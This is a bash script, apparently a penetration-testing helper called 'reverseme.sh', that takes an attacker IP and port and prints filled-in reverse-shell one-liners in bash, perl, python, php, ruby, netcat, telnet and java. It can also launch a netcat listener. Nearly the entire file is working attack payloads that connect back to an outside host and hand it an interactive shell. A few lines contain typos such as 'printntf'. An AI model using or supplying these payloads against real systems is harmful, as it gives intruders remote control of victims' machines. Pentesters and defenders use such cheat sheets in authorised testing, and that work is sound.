#!/bin/bash

# This script will allow you to set a default IP and paste reverse shells on the fly

######## Written by Matthew Greer ########
######## J>^v ########

RED='\033[0;31m' # Display titles
GREEN='\033[0;32m' # Display helpful information
NC='\033[0m' # Default color

clear # clear the screen place # before clear, if you want to disable this option

# Display bash shells
function bash() {
    printf "\n\t${RED}##########${NC}BASH SHELL(S)${RED}##########${NC}\n\n"

    printf "bash -i >& /dev/tcp/${RHOST}/${LPORT} 0>&1"

    printf "\n\n"

    printf "exec /bin/bash 0&0 2>&0"

    printf "\n\n"

    printf "0<&196;exec 196<>/dev/tcp/${RHOST}/${LPORT}; sh <&196 >&196 2>&196"

    printf "exec 5<>/dev/tcp/${RHOST}/${LPORT} cat <&5 | while read line; do $line 2>&5 >&5; done"

    printf "\n\n"
}

# Display perl shells
function perl() {
    printf "\n\t${RED}##########${NC}PERL SHELL(S)${RED}##########${NC}\n\n"

    printf "perl -e 'use Socket;$i=\"\${RHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

    printf "\n\n"

    printf "${GREEN} LINUX: ${NC}\n"

    printf "\tperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${RHOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"

    printf "\n\n"

    printf "${GREEN} WINDOWS: ${NC}\n"

    printf "\tperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${RHOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"

    printntf "\n\n"
}

# Display python shells
function python() {
    printf "\n\t${RED}##########${NC}PYTHON SHELL(S)${RED}##########${NC}\n\n"

    printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${RHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    printf "\n\n"
}

# Display php shells
function php() {
    printf "\n\t${RED}##########${NC}PHP SHELL(S)${RED}##########${NC}\n\n"

    printf "php -r '$sock=fsockopen(\"${RHOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    printf "\n\n"
}

# Display ruby shells
function ruby() {
    printf "\n\t${RED}##########${NC}RUBY SHELL(S)${RED}##########${NC}\n\n"

    printf "ruby -rsocket -e'f=TCPSocket.open(\"${RHOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

    printf "\n\n"

    printf "${GREEN} LINUX: ${NC}\n"

    printf "\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${RHOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

    printf "\n\n"

    printf "${GREEN} WINDOWS: ${NC}\n"

    printf "\truby -rsocket -e 'c=TCPSocket.new(\"${RHOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

    printf "\n\n"
}

# Display netcat shells
function netcat() {
    printf "\n\t${RED}##########${NC}NETCAT SHELL(S)${RED}##########${NC}\n\n"

    printf "nc -e /bin/sh ${RHOST} ${LPORT}"

    printf "\n\n"

    printf "nc -c /bin/sh ${RHOST} ${LPORT}"

    printf "\n\n"

    printf "/bin/sh | nc ${RHOST} ${LPORT}"

    printf "\n\n"

    printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${RHOST} ${LPORT} >/tmp/f"

    printf "\n\n"
}

# Display telnet shells
function telnet() {
    printf "\n\t${RED}##########${NC}TELNET SHELL(S)${RED}##########${NC}\n\n"

    printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${RHOST} ${LPORT} 0/tmp/p"

    printf "\n\n"

    printf "${GREEN} Listen on machine on port 4445/tcp ${NC}\n"

    printf "\ttelnet ${RHOST} ${LPORT} | /bin/bash | telnet ${RHOST} 4445"

    printf "\n\n"
}

# Display java shells
function java() {
    printf "\n\t${RED}##########${NC}JAVA SHELL(S)${RED}##########${NC}\n\n"

    printf "r = Runtime.getRuntime()"
    printf "\n"
    printf "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${RHOST}/${LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])"
    printf "\n"
    printf "p.waitFor()"

    printf "\n\n"

}

# Spawn nc listener with -L option
function spawn_listener() {
    gnome-terminal -e "nc -lvp ${LPORT}"

}

# Display help menu with -h option
function help() {
    printf "\n\t\t${RED}##########${NC}HELP MENU${RED}##########${NC}\n\n"

    printf "\nreverseme.sh -h Display's this help menu.\n"

    printf "\nUsuage: reverseme.sh -r [RHOST] -l [LPORT] -s [REVERSE-SHELL-SELECTION] ${GREEN}OPTIONAL${NC} -L [SPAWN-NC-LISTENER]\n"

    printf "\nreverseme.sh -S Display's source information.\n"

    printf "\nreverseme.sh -V Display's version information.\n\n"

    exit 0
}

# Display sources with -S option
function sources() {
    printf "\n\t${RED}##########${NC}SOURCES${RED}##########${NC}\n\n"
    printf "${GREEN} PENTEST MONKEY ${NC}\n"
    printf "\thttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n\n"

    printf "${GREEN} BERNARDO REVERSE SHELL ONE LINERS ${NC}\n"
    printf "\thttps://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html"

    printf "\n\n"

    exit 0
}

# Display version information with -V option
function version() {
    printf "\n\t${RED}##########${NC}VERSION${RED}##########${NC}\n\n"

    printf "\nVersion:\t2.0\n\n"

    exit 0
}

while getopts "hSVr:l:s:L" arg; do
    case $arg in 
        h) # help menu
            help
            break
           ;;
        S) # Display sources
            sources
            break
            ;;

        V) # Display version information
            version
            break
            ;;

        r) # set attack RHOST
            RHOST=$OPTARG
            ;;
            
        l) # set lport
            LPORT=$OPTARG
            ;;
            
        s) # Select what language to display reverse shell in
            SELECTION=$OPTARG
            ;;

        L)
            spawn_listener
            ;;   
    esac
done

if [[ -z ${RHOST} ]] || [[ -z ${LPORT} ]] ; then
    printf "\nPlease specify an attack-ip and/or a listening port!\n\n"
    exit 1

elif [[ "${SELECTION}" == "bash" ]] || [[ "${SELECTION}" == "BASH" ]] || [[ "${SELECTION}" == "Bash" ]] ; then
    bash

elif [[ "${SELECTION}" == "perl" ]] || [[ "${SELECTION}" == "PERL" ]] || [[ "${SELECTION}" == "Perl" ]] ; then
    perl
    
elif [[ "${SELECTION}" == "python" ]] || [[ "${SELECTION}" == "PYTHON" ]] || [[ "${SELECTION}" == "Python" ]] ; then
    python

elif [[ "${SELECTION}" == "php" ]] || [[ "${SELECTION}" == "PHP" ]] || [[ "${SELECTION}" == "Php" ]] ; then
    php

elif [[ "${SELECTION}" == "ruby" ]] || [[ "${SELECTION}" == "RUBY" ]] || [[ "${SELECTION}" == "Ruby" ]] ; then
    ruby

elif [[ "${SELECTION}" == "netcat" ]] || [[ "${SELECTION}" == "NETCAT" ]] || [[ "${SELECTION}" == "Netcat" ]] ; then
    netcat

elif [[ "${SELECTION}" == "telnet" ]] || [[ "${SELECTION}" == "TELNET" ]] || [[ "${SELECTION}" == "Telnet" ]] ; then
    telnet

elif [[ "${SELECTION}" == "java" ]] || [[ "${SELECTION}" == "JAVA" ]] || [[ "${SELECTION}" == "Java" ]] ; then
    java

else
    printf "\nInvalid argument!\n\n"
    exit 1
fi
